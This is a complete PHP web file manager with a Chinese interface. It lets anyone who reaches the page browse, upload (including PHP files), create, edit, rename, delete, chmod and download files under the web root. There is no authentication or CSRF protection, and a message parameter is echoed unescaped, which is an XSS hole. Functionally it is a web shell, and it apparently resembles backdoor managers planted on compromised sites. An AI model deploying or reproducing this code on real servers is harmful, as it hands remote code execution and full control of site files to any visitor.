<?php
session_start();

$root = rtrim(realpath($_SERVER['DOCUMENT_ROOT']), DIRECTORY_SEPARATOR);
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

if ($dir === false || strpos($dir, $root) !== 0) {
    $dir = $root;
}

$msg = '';
$msg_type = 'success';

function fm_perm($p) {
    $perms = fileperms($p);
    $info = is_dir($p) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

function fm_size($bytes) {
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function safe_filename($name) {
    $name = str_replace(['../', '..\\', '/', '\\'], '', $name);
    return trim($name);
}

if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $p = realpath($_GET['delete']);
    if ($p && strpos($p, $root) === 0) {
        $ok = is_file($p) ? @unlink($p) : @rmdir($p);
        $msg = $ok ? "删除成功" : "删除失败（权限不足或目录非空）";
        $msg_type = $ok ? "success" : "error";
    } else {
        $msg = "非法路径";
        $msg_type = "error";
    }
    header("Location: ?dir=" . urlencode($dir) . "&msg=" . urlencode($msg) . "&type=" . $msg_type);
    exit;
}

if (isset($_POST['single_chmod']) && !empty($_POST['file']) && !empty($_POST['chmod_val'])) {
    $p = realpath($_POST['file']);
    $val = $_POST['chmod_val'];
    if ($p && strpos($p, $root) === 0 && preg_match('/^0?\d{3}$/', $val)) {
        $ok = @chmod($p, octdec($val));
        $msg = $ok ? "权限修改成功" : "权限修改失败";
        $msg_type = $ok ? "success" : "error";
    } else {
        $msg = "参数错误";
        $msg_type = "error";
    }
}

if (isset($_POST['bulk_delete']) && !empty($_POST['items'])) {
    $success = $fail = 0;
    foreach ($_POST['items'] as $item) {
        $p = realpath($item);
        if ($p && strpos($p, $root) === 0) {
            $ok = is_file($p) ? @unlink($p) : @rmdir($p);
            $ok ? $success++ : $fail++;
        }
    }
    $msg = "批量删除：成功 $success 项，失败 $fail 项";
    $msg_type = $fail == 0 ? "success" : "error";
}

if (isset($_POST['bulk_chmod']) && !empty($_POST['items']) && !empty($_POST['chmod'])) {
    $mode = $_POST['chmod'];
    if (!preg_match('/^0?\d{3}$/', $mode)) {
        $msg = "权限格式错误（例：0755）";
        $msg_type = "error";
    } else {
        $success = $fail = 0;
        $m = octdec($mode);
        foreach ($_POST['items'] as $item) {
            $p = realpath($item);
            if ($p && strpos($p, $root) === 0) {
                $ok = @chmod($p, $m);
                $ok ? $success++ : $fail++;
            }
        }
        $msg = "批量权限：成功 $success 项，失败 $fail 项";
        $msg_type = $fail == 0 ? "success" : "error";
    }
}


if (isset($_POST['mkdir']) && !empty($_POST['name'])) {
    $name = safe_filename($_POST['name']);
    $np = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    if (file_exists($np)) {
        $msg = "文件夹已存在";
        $msg_type = "error";
    } else {
        $ok = @mkdir($np, 0755, true);
        $msg = $ok ? "创建成功" : "创建失败";
        $msg_type = $ok ? "success" : "error";
    }
}


if (isset($_POST['mkfile']) && !empty($_POST['name'])) {
    $name = safe_filename($_POST['name']);
    $np = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    if (file_exists($np)) {
        $msg = "文件已存在";
        $msg_type = "error";
    } else {
        $ok = file_put_contents($np, "<?php\n// Created\n");
        $msg = $ok ? "创建成功" : "创建失败";
        $msg_type = $ok ? "success" : "error";
    }
}


if (isset($_POST['rename']) && !empty($_POST['old']) && !empty($_POST['new'])) {
    $old = realpath($_POST['old']);
    $new = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . safe_filename($_POST['new']);
    if ($old && $new && strpos($old, $root) === 0) {
        $ok = @rename($old, $new);
        $msg = $ok ? "重命名成功" : "重命名失败";
        $msg_type = $ok ? "success" : "error";
    } else {
        $msg = "路径非法";
        $msg_type = "error";
    }
}


$save_success = false;
if (isset($_POST['savefile']) && !empty($_POST['file'])) {
    $file = realpath($_POST['file']);
    if ($file && strpos($file, $root) === 0 && is_file($file)) {
        $content = $_POST['content'];
        $ok = file_put_contents($file, $content);
        if ($ok !== false) {
            $msg = "文件保存成功";
            $msg_type = "success";
            $save_success = true;
        } else {
            $msg = "保存失败（权限不足）";
            $msg_type = "error";
        }
    } else {
        $msg = "文件不存在或路径非法";
        $msg_type = "error";
    }
}


if (isset($_POST['upload']) && !empty($_FILES['files'])) {
    $uploaded = 0;
    $failed = 0;
    $exists = 0;

    foreach ($_FILES['files']['name'] as $i => $orig_name) {
        if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) {
            $failed++;
            continue;
        }

        $tmp = $_FILES['files']['tmp_name'][$i];
        $name = safe_filename($orig_name);
        $dest = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;

        if (file_exists($dest)) {
            $exists++;
            continue;
        }

        if (move_uploaded_file($tmp, $dest)) {
            $uploaded++;
        } else {
            $failed++;
        }
    }

    $msg = "上传结果：成功 $uploaded 个，已存在 $exists 个，失败 $failed 个";
    $msg_type = ($failed == 0) ? "success" : "error";
}


if (isset($_GET['download'])) {
    $f = realpath($_GET['download']);
    if ($f && strpos($f, $root) === 0 && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}


$edit_content = '';
$edit_file = '';
if (!$save_success && isset($_GET['edit'])) {
    $edit_file = realpath($_GET['edit']);
    if ($edit_file && strpos($edit_file, $root) === 0 && is_file($edit_file)) {
        $edit_content = file_get_contents($edit_file);
    }
}


$breadcrumb = [];
$path_parts = explode(DIRECTORY_SEPARATOR, $dir);
$current = '';

foreach ($path_parts as $part) {
    if ($part === '') continue;
    $current .= ($current ? DIRECTORY_SEPARATOR : '') . $part;
    $breadcrumb[] = [
        'name' => $part,
        'path' => $current
    ];
}


$files = array_diff(scandir($dir), ['.', '..']);
$dirs = [];
$file_list = [];
foreach ($files as $f) {
    $p = $dir . DIRECTORY_SEPARATOR . $f;
    is_dir($p) ? $dirs[] = $f : $file_list[] = $f;
}
sort($dirs);
sort($file_list);
$sorted_files = array_merge($dirs, $file_list);

if (isset($_GET['msg'])) {
    $msg = $_GET['msg'];
    $msg_type = $_GET['type'] ?? 'success';
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>文件管理器</title>
    <style>
        *{box-sizing:border-box}
        body{margin:20px;background:#f0f0f1;font-family:system-ui}
        .container{max-width:1400px;margin:0 auto}
        .msg{padding:12px 15px;border-radius:6px;margin-bottom:12px}
        .msg.success{background:#d7f5e3;color:#0d4f00}
        .msg.error{background:#fee7e7;color:#6b0000}
        .editor-box{background:#fff;padding:15px;border-radius:6px;margin-bottom:15px;border:1px solid #ccc}
        textarea{width:100%;height:320px;font-family:monospace;padding:10px;border:1px solid #ddd}
        .nav{background:#fff;padding:10px 15px;border-radius:6px;margin-bottom:12px}
        .nav a{color:#135e96;text-decoration:none;margin:0 4px}
        .bar{display:flex;gap:10px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
        input,button{padding:6px 10px;border:1px solid #ddd;border-radius:4px}
        button{background:#135e96;color:#fff;border:none;cursor:pointer}
        .btn-danger{background:#d63638}
        table{width:100%;background:#fff;border-collapse:collapse;border-radius:6px;overflow:hidden}
        th,td{padding:10px;text-align:left;border-bottom:1px solid #eee}
        th{background:#f6f7f7}
        .op-btn{font-size:13px;padding:4px 8px;margin:0 2px}
    </style>
</head>
<body>
<div class="container">

    <?php if (!empty($msg)): ?>
    <div class="msg <?php echo $msg_type ?>"><?php echo $msg ?></div>
    <?php endif; ?>

    <?php if ($edit_file): ?>
    <div class="editor-box">
        <h3>编辑：<?php echo basename($edit_file) ?></h3>
        <form method="post">
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($edit_file) ?>">
            <textarea name="content"><?php echo htmlspecialchars($edit_content) ?></textarea>
            <p style="margin-top:10px"><button type="submit" name="savefile">保存文件</button></p>
        </form>
    </div>
    <?php endif; ?>

    <div class="nav">
        位置：
        <?php foreach ($breadcrumb as $i => $item): ?>
            <?php if($i > 0) echo '/'; ?>
            <a href="?dir=<?php echo urlencode($item['path']) ?>">
                <?php echo htmlspecialchars($item['name']) ?>
            </a>
        <?php endforeach; ?>
    </div>

    <div class="bar">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit" name="upload">批量上传</button>
        </form>
        <form method="post">
            <input type="text" name="name" placeholder="新建文件夹" required>
            <button type="submit" name="mkdir">创建</button>
        </form>
        <form method="post">
            <input type="text" name="name" placeholder="新建文件" required>
            <button type="submit" name="mkfile">创建</button>
        </form>
    </div>

    <form method="post">
        <div class="bar">
            <input type="text" name="chmod" value="0755" style="width:70px">
            <button type="submit" name="bulk_chmod">批量权限</button>
            <button type="submit" name="bulk_delete" class="btn-danger" onclick="return confirm('确定删除？')">批量删除</button>
        </div>

        <table>
            <tr>
                <th><input type="checkbox" id="checkAll"></th>
                <th>名称</th>
                <th>权限</th>
                <th>大小</th>
                <th>修改时间</th>
                <th>操作</th>
            </tr>
            <tr>
                <td></td>
                <td><a href="?dir=<?php echo urlencode(dirname($dir)) ?>">↑ 返回上级</a></td>
                <td>-</td><td>-</td><td>-</td><td>-</td>
            </tr>
            <?php foreach ($sorted_files as $f): ?>
            <?php
                $p = $dir . DIRECTORY_SEPARATOR . $f;
                $is_file = is_file($p);
            ?>
            <tr>
                <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($p) ?>"></td>
                <td>
                    <?php if ($is_file): ?>
                        <?php echo htmlspecialchars($f) ?>
                    <?php else: ?>
                        <a href="?dir=<?php echo urlencode($p) ?>"><?php echo htmlspecialchars($f) ?></a>
                    <?php endif; ?>
                </td>
                <td><?php echo fm_perm($p) ?></td>
                <td><?php echo $is_file ? fm_size(filesize($p)) : '-' ?></td>
                <td><?php echo date('Y-m-d H:i', filemtime($p)) ?></td>
                <td>
                    <?php if ($is_file): ?>
                        <a href="?edit=<?php echo urlencode($p) ?>&dir=<?php echo urlencode($dir) ?>" class="op-btn">编辑</a>
                        <a href="?download=<?php echo urlencode($p) ?>" class="op-btn">下载</a>
                    <?php endif; ?>

                    <form method="post" style="display:inline">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($p) ?>">
                        <input type="text" name="chmod_val" value="0755" style="width:60px">
                        <button type="submit" name="single_chmod" class="op-btn">权限</button>
                    </form>

                    <a href="?delete=<?php echo urlencode($p) ?>&dir=<?php echo urlencode($dir) ?>" class="op-btn btn-danger" onclick="return confirm('确定删除？')">删除</a>

                    <form method="post" style="display:inline">
                        <input type="hidden" name="old" value="<?php echo htmlspecialchars($p) ?>">
                        <input type="text" name="new" placeholder="新名称" style="width:80px">
                        <button type="submit" name="rename" class="op-btn">重命名</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </form>
</div>

<script>
document.getElementById('checkAll').onchange = function(){
    document.querySelectorAll('input[name="items[]"]').forEach(cb => cb.checked = this.checked)
}
</script>
</body>
</html>